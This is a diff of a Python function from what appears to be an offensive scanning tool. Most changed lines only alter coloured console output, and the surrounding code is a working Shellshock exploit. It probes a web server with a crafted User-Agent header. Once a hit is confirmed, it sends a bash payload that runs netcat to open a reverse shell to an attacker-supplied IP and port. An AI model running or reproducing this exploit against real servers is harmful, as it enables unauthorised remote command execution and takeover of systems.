@@ -31,13 +31,13 @@ def shellshock0x00(web):
     cmd = "() { test;};/bin/nopatchobfu"
     headers = {'User-agent': cmd}
     time.sleep(0.5)
-    print(O+' [*] Making no-verify request...')
+    print(C+' [*] Making no-verify request...')
     time.sleep(1)
     r = requests.get(web, headers=headers, verify=False)
     if r.status_code == 500 or r.status_code == 502:
-        print(G+' [+] The website seems Vulnerable to Shellshock...')
+        print(G+' [+] The website seems Vulnerable to Shellshock...'+C+color.TR2+C)
         time.sleep(0.5)
-        print(O+' [*] Confirming the vulnerability...')
+        print(C+' [*] Confirming the vulnerability...'+C)
 
         headers = {
                     'User-Agent' : con,
@@ -48,16 +48,16 @@ def shellshock0x00(web):
         resp = requests.get(web, headers=headers, verify=False)
         if resp.status_code == 200:
             if re.search(r_str,resp.content,re.I):
-                print(G+' [+] ShellShock was found in: %s'%(resp.url))
-                print(GR+' [*] Preparing for the exploitation phase...')
+                print(O+' [+] ShellShock was found in:'+C+color.TR3+C+G+resp.url+C+color.TR2+C)
+                print(P+' [*] Preparing for the exploitation phase...'+C)
                 time.sleep(0.4)
                 print(GR+' [*] Configuring payload...')
                 if properties["SHELL-IP"][1] == " ":
-                    ip = input(O+' [#] Enter reverse IP :> ')
+                    ip = input(C+' [§] Enter reverse IP :> ')
                 else:
                     ip = properties["SHELL-PORT"][1]
                 if properties["SHELL-IP"][1] == " ":
-                    port = input(' [#] Enter port :> ')
+                    port = input(' [§] Enter port :> ')
                 else:
                     port = properties["SHELL-PORT"][1]
                 exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
@@ -65,7 +65,7 @@ def shellshock0x00(web):
                 print(C+' [!] Using payload : '+B+exp)
                 print(GR+' [*] Exploiting...')
                 time.sleep(1)
-                print(O+' [!] Using no-verify mode to avoid IP leakage...')
+                print(P+' [!] Using no-verify mode to avoid IP leakage...'+C)
                 try:
                     head = {'User-agent':exp}
                     r=requests.get(web, headers=head, verify=False)
@@ -74,7 +74,7 @@ def shellshock0x00(web):
 
         else:
             print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
-            print(O+' [!] Please check manually...')
+            print(R+' [!] Please check manually...')
     else:
         print(R+' [-] The web seems immune to shellshock...')
 
